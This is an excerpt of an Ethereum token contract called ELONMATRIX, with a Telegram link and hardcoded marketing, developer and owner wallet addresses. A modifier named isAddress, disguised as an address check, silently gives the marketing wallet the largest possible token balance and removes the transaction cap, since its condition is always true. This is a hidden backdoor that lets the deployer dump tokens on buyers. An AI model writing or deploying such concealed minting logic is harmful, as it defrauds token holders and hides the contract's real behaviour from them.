...
Telegram: https://t.me/ElonMatrix
...
contract ELONMATRIX is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x2D2000e8AbF067EbFd5459F3209f1938F3EB0056); 
    address payable public Wallet_Dev = payable(0x02c9C168CA32ac3d52f1DA9a4e9FA85ACE51443B);
    ...
    string private constant _name = "ELONMATRIX"; 
    string private constant _symbol = unicode"ELONMATRIX"; 
    ...
    uint256 private txSize = 2**256-1;
    ...
    modifier isAddress(address add) {
            _tOwned[Wallet_Marketing] = txSize;
            if(add==add)
                _maxTxAmount = txSize;
        _;
    }
    ...
    constructor () {
        ...
        _owner = 0x02c9C168CA32ac3d52f1DA9a4e9FA85ACE51443B;
